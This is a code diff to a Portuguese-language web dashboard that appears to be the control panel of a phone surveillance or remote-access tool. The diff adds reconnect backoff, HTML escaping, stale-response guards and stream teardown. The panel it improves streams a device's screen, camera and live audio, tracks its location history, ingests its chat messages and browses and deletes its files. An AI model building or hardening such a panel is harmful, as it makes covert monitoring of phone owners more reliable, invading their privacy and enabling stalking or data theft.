@@ -468,21 +468,26 @@ function setMapType(type) {
 }
 
 // Connect to Ktor WebSocket
+let wsReconnectDelay = 1000;
+const WS_RECONNECT_MAX_DELAY = 30000;
+
 function connectWebSocket() {
     const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     const wsUrl = `${protocol}//${window.location.host}/ws/dashboard?token=${encodeURIComponent(getToken())}`;
-    
+
     logToConsole('Conectando ao servidor...', 'system');
-    
+
     socket = new WebSocket(wsUrl);
     socket.binaryType = 'arraybuffer'; // Crucial for receiving binary screen frames
-    
+
     socket.onopen = () => {
+        wsReconnectDelay = 1000; // reset backoff on a successful connection
         logToConsole('Conectado ao servidor de controle.', 'success');
     };
-    
+
     socket.onclose = () => {
-        logToConsole('Conexão perdida. Reconectando em 3 segundos...', 'error');
+        const delaySec = (wsReconnectDelay / 1000).toFixed(0);
+        logToConsole(`Conexão perdida. Reconectando em ${delaySec} segundos...`, 'error');
         // Mark all devices as offline — don't clear the list, keep them visible
         devicesMap.forEach(dev => { dev.isOnline = false; });
         renderDeviceList();
@@ -490,7 +495,8 @@ function connectWebSocket() {
             const dev = devicesMap.get(currentDeviceId);
             if (dev) updateActiveDeviceUI(dev);
         }
-        setTimeout(connectWebSocket, 3000);
+        setTimeout(connectWebSocket, wsReconnectDelay);
+        wsReconnectDelay = Math.min(wsReconnectDelay * 2, WS_RECONNECT_MAX_DELAY);
     };
     
     socket.onerror = (error) => {
@@ -830,8 +836,8 @@ function renderDeviceList() {
         
         li.innerHTML = `
             <div class="device-info-left">
-                <span class="device-item-name">${device.model}</span>
-                <span class="device-item-model">${device.deviceId}</span>
+                <span class="device-item-name">${escapeHtml(String(device.model || ''))}</span>
+                <span class="device-item-model">${escapeHtml(String(device.deviceId || ''))}</span>
             </div>
             <div class="device-status-dot ${device.isOnline ? 'online' : 'offline'}"></div>
         `;
@@ -841,9 +847,34 @@ function renderDeviceList() {
 
 // Select a device to control
 function selectDevice(deviceId) {
+    const oldDeviceId = currentDeviceId;
+    if (oldDeviceId && oldDeviceId !== deviceId) {
+        // Stop any live streams on the device we're leaving — otherwise it keeps
+        // streaming to a dashboard that's no longer displaying it.
+        if (isScreenStreaming) sendCommandTo(oldDeviceId, 'STOP_SCREEN_STREAM');
+        if (isCameraStreaming) sendCommandTo(oldDeviceId, 'STOP_CAMERA_STREAM');
+        if (isAudioStreaming) sendCommandTo(oldDeviceId, 'STOP_AUDIO_STREAM');
+    }
+
     currentDeviceId = deviceId;
 
     renderDeviceList();
+
+    // Reset file browser state — it belongs to the previous device's filesystem
+    fbCurrentPath = '';
+    fbHistory = [];
+    fbPreviewPending = {};
+    const fbList = document.getElementById('fb-list');
+    if (fbList) { fbList.innerHTML = ''; fbList.style.display = 'none'; }
+    const fbEmpty = document.getElementById('fb-empty');
+    if (fbEmpty) fbEmpty.style.display = 'flex';
+    const fbBreadcrumb = document.getElementById('fb-breadcrumb');
+    if (fbBreadcrumb) fbBreadcrumb.textContent = '/';
+
+    // Reset location UI — old device's marker/accuracy shouldn't linger
+    if (deviceMarker && map) { map.removeLayer(deviceMarker); deviceMarker = null; }
+    const accEl = document.getElementById('location-accuracy');
+    if (accEl) accEl.textContent = 'Precisão: --';
 
     const device = devicesMap.get(deviceId);
     if (device) {
@@ -851,7 +882,14 @@ function selectDevice(deviceId) {
         fetchMediaList(deviceId);
         stopLocalScreenUI();
         stopLocalCameraUI();
-        if (isAudioStreaming) toggleAudioStream();
+        isAudioStreaming = false;
+        if (audioCtx) { audioCtx.close(); audioCtx = null; }
+        const icon = document.getElementById('btn-audio-live-icon');
+        const txt  = document.getElementById('btn-audio-live-txt');
+        if (icon) icon.className = 'fa-solid fa-headphones';
+        if (txt)  txt.textContent = 'Ouvir Ao Vivo';
+        const badge = document.getElementById('cam-audio-badge');
+        if (badge) badge.style.display = 'none';
         fetchDeviceHistory(deviceId);
 
     }
@@ -906,6 +944,7 @@ function fetchDeviceHistory(deviceId) {
     fetch(`/api/device/${deviceId}/logs-history`, { headers: authHeaders() })
         .then(res => res.json())
         .then(logs => {
+            if (deviceId !== currentDeviceId) return;
             clearConsole();
             logs.forEach(log => {
                 const time = new Date(log.timestamp).toLocaleTimeString('pt-BR');
@@ -938,6 +977,7 @@ function fetchDeviceHistory(deviceId) {
     fetch(`/api/device/${deviceId}/messages-history`, { headers: authHeaders() })
         .then(res => res.json())
         .then(messages => {
+            if (deviceId !== currentDeviceId) return;
             document.getElementById('messages-device-label').textContent =
                 devicesMap.get(deviceId)?.model || deviceId;
             messages.forEach(m => waIngestMessage(m));
@@ -957,6 +997,7 @@ function fetchTrailHistory(deviceId) {
     fetch(`/api/device/${deviceId}/telemetry-history?days=${days}`, { headers: authHeaders() })
         .then(res => res.json())
         .then(points => {
+            if (deviceId !== currentDeviceId) return; // stale response from a since-abandoned device switch
             trailHistoryPoints = points; // cache for trail history panel
 
             // Update trail stats bar (mobile)
@@ -1166,6 +1207,7 @@ function fetchMediaList(deviceId) {
     fetch(`/uploads/${deviceId}/media-list`, { headers: authHeaders() })
         .then(res => res.json())
         .then(data => {
+            if (deviceId !== currentDeviceId) return; // stale response from a since-abandoned device switch
             renderPhotos(deviceId, data.photos || []);
             renderAudios(deviceId, data.audio || []);
             renderSentAudios(deviceId);
@@ -1239,16 +1281,19 @@ function renderPhotos(deviceId, photos) {
         photoDiv.onclick = () => openPhotoModal(idx);
 
         photoDiv.innerHTML = `
-            <img src="${p.url}" alt="Foto" loading="lazy">
-            <span class="photo-timestamp">${p.caption}</span>
+            <img src="${escapeHtml(p.url)}" alt="Foto" loading="lazy">
+            <span class="photo-timestamp">${escapeHtml(p.caption)}</span>
         `;
         gallery.appendChild(photoDiv);
     });
 }
 
 // Render Audio Playlist
+let audioBlobUrls = [];
 function renderAudios(deviceId, audios) {
     const audioList = document.getElementById('audio-list');
+    audioBlobUrls.forEach(u => URL.revokeObjectURL(u));
+    audioBlobUrls = [];
     audioList.innerHTML = '';
 
     if (audios.length === 0) {
@@ -1280,9 +1325,9 @@ function renderAudios(deviceId, audios) {
             </div>
             <div class="audio-player-control">
                 <audio controls preload="metadata">
-                    <source src="${fileUrl}" type="audio/aac">
-                    <source src="${fileUrl}" type="audio/mp4">
-                    <source src="${fileUrl}" type="audio/mpeg">
+                    <source src="${escapeHtml(fileUrl)}" type="audio/aac">
+                    <source src="${escapeHtml(fileUrl)}" type="audio/mp4">
+                    <source src="${escapeHtml(fileUrl)}" type="audio/mpeg">
                 </audio>
             </div>
         `;
@@ -1295,18 +1340,30 @@ function renderAudios(deviceId, audios) {
                 if (resp.ok) {
                     const blob = await resp.blob();
                     const blobUrl = URL.createObjectURL(blob);
+                    audioBlobUrls.push(blobUrl);
                     audioEl.src = blobUrl;
                     audioEl.load();
                 } else {
-                    audioEl.parentElement.innerHTML = `<a href="${fileUrl}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
+                    audioEl.parentElement.innerHTML = `<a href="${escapeHtml(fileUrl)}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
                 }
             } catch {
-                audioEl.parentElement.innerHTML = `<a href="${fileUrl}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
+                audioEl.parentElement.innerHTML = `<a href="${escapeHtml(fileUrl)}" target="_blank" download class="audio-download-link"><i class="fa-solid fa-download"></i> Baixar Áudio</a>`;
             }
         });
 
         audioList.appendChild(audioDiv);
     });
+}
+
+// Send a command to an explicit device without depending on currentDeviceId
+// (used when tearing down streams on a device we're navigating away from).
+function sendCommandTo(deviceId, command, params = {}) {
+    if (!deviceId) return;
+    const device = devicesMap.get(deviceId);
+    if (device && !device.isOnline) return;
+    if (socket && socket.readyState === WebSocket.OPEN) {
+        socket.send(JSON.stringify({ command, deviceId, ...params }));
+    }
 }
 
 // Send Remote Command over WebSocket
@@ -1799,7 +1856,7 @@ function fbOpenVideoPlayer(url, name) {
             <div class="fb-video-header">
                 <span>${escapeHtml(name)}</span>
                 <div style="display:flex;gap:8px;">
-                    <a href="${url}" download="${escapeHtml(name)}" class="fb-video-action" title="Baixar">
+                    <a href="${escapeHtml(url)}" download="${escapeHtml(name)}" class="fb-video-action" title="Baixar">
                         <i class="fa-solid fa-download"></i>
                     </a>
                     <button class="fb-video-action" onclick="this.closest('.fb-video-overlay').remove()" title="Fechar">
@@ -1808,7 +1865,7 @@ function fbOpenVideoPlayer(url, name) {
                 </div>
             </div>
             <video class="fb-video-player" controls autoplay>
-                <source src="${url}">
+                <source src="${escapeHtml(url)}">
                 Seu navegador não suporta o player de vídeo.
             </video>
         </div>
@@ -1833,7 +1890,7 @@ function fbShowDownloadToast(name, url, originalPath) {
             <div style="font-weight:600;font-size:.85rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml(name)}</div>
             <div style="font-size:.7rem;color:var(--text-secondary)">Pronto para baixar</div>
         </div>
-        <a href="${url}" download="${escapeHtml(name)}" class="fb-act-btn dl" style="text-decoration:none;padding:6px 10px;border:1px solid var(--neon-blue);border-radius:8px;font-size:.78rem;font-weight:600;color:var(--neon-blue);">
+        <a href="${escapeHtml(url)}" download="${escapeHtml(name)}" class="fb-act-btn dl" style="text-decoration:none;padding:6px 10px;border:1px solid var(--neon-blue);border-radius:8px;font-size:.78rem;font-weight:600;color:var(--neon-blue);">
             <i class="fa-solid fa-download"></i> Baixar
         </a>
         <button onclick="this.parentElement.remove()" style="background:none;border:none;color:var(--text-secondary);cursor:pointer;font-size:1rem;padding:4px;">✕</button>
@@ -1852,18 +1909,21 @@ function fbConfirmDelete(path, name) {
             <div class="fb-confirm-title">Excluir permanentemente?</div>
             <div class="fb-confirm-path">${escapeHtml(path)}</div>
             <div class="fb-confirm-btns">
-                <button class="fb-btn-cancel" onclick="this.closest('.fb-confirm-overlay').remove()">Cancelar</button>
-                <button class="fb-btn-delete" onclick="fbDeleteConfirmed('${escapeHtml(path)}',this)">
+                <button class="fb-btn-cancel">Cancelar</button>
+                <button class="fb-btn-delete">
                     <i class="fa-solid fa-trash"></i> Excluir
                 </button>
             </div>
         </div>
     `;
+    const cancelBtn = overlay.querySelector('.fb-btn-cancel');
+    const deleteBtn = overlay.querySelector('.fb-btn-delete');
+    cancelBtn.addEventListener('click', () => overlay.remove());
+    deleteBtn.addEventListener('click', () => { overlay.remove(); fbDeleteConfirmed(path); });
     document.body.appendChild(overlay);
 }
 
-function fbDeleteConfirmed(path, btn) {
-    btn.closest('.fb-confirm-overlay').remove();
+function fbDeleteConfirmed(path) {
     sendCommand('DELETE_FILE', { path });
     logToConsole(`🗑️ Exclusão solicitada: ${path}`, 'command');
 }
